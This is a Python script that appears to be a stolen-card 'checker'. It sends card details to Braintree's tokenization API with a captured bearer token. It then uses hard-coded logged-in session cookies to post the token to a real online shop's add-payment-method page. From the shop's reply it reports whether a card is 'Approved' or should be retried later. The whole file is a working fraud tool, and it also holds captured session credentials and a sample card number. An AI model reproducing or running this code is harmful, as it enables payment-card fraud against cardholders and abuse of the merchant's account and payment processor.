def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	








	




















	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUxNTAwOTksImp0aSI6Ijk4NWY3MzJlLTYyNmYtNGZlNi1iZTQyLTZlMmEwOGJlMWFkZCIsInN1YiI6IndqeTM1MnhmNjZ2MnhqanMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndqeTM1MnhmNjZ2MnhqanMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImNhbGlmb3JuaWFiYWxzYW1pY19pbnN0YW50In19.8_J-Oe9XpMuyqc2bHsRhMcInLOVEeHTdlkqSXrED9TOmIiTkkdUFns2kBaQkXjB1nhHhh-Uypv7YSG8w1ymxKA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'e7dc5fee-97e4-4cbc-a4a7-e88ede0d622e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"e7dc5fee-97e4-4cbc-a4a7-e88ede0d622e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111972036167182","expirationMonth":"03","expirationYear":"2028","cvv":"793","billingAddress":{"postalCode":"10080"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']















	cookies = {
    '_ga': 'GA1.1.1361356414.1723395958',
    '_gcl_au': '1.1.392118097.1723395958',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-31%2000%3A20%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-08-31%2000%3A20%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'wordpress_logged_in_83249851e694e9b638315f4ba74cd026': 'guggcc55%7C1725668466%7CleNclCbxfGADWv5DyZKxSr23yoF2vuSo5YsOOH8McLn%7Cf9b0227985bd0188329346ae1b7b8fbf9778a810b823e4aedd745c9560458acb',
    '_ga_K96HYPSPHJ': 'GS1.1.1725063648.4.0.1725063667.0.0.0',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_VCS9LN7CYC': 'GS1.1.1725063640.6.1.1725063700.0.0.0',
}

	headers = {
    'authority': 'californiabalsamic.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1361356414.1723395958; _gcl_au=1.1.392118097.1723395958; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-31%2000%3A20%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-08-31%2000%3A20%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_83249851e694e9b638315f4ba74cd026=guggcc55%7C1725668466%7CleNclCbxfGADWv5DyZKxSr23yoF2vuSo5YsOOH8McLn%7Cf9b0227985bd0188329346ae1b7b8fbf9778a810b823e4aedd745c9560458acb; _ga_K96HYPSPHJ=GS1.1.1725063648.4.0.1725063667.0.0.0; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcaliforniabalsamic.com%2Fmy-account%2Fadd-payment-method%2F; _ga_VCS9LN7CYC=GS1.1.1725063640.6.1.1725063700.0.0.0',
    'origin': 'https://californiabalsamic.com',
    'pragma': 'no-cache',
    'referer': 'https://californiabalsamic.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"92568c34cd7ea0a4b51f8bf0be41fe21","fraud_merchant_id":null,"correlation_id":"09bb1613-9cea-48f5-88a3-b4359184"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wjy352xf66v2xjjs/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wjy352xf66v2xjjs"},"merchantId":"wjy352xf66v2xjjs","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"California Balsamic","clientId":"AYRVrn6pUl7IvdnCrSSQLFUUxvjLeiTNcsX-i2yBYxrX2rTA8PJ7pBR2dsWMTlNPv7EbFzyXytQuYfqx","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"californiabalsamic_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'billing_address_1': 'hhfhfbfv',
    'woocommerce-add-payment-method-nonce': 'ce9e98c227',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://californiabalsamic.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	text = response.text
	pattern = r'Reason: (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result


	
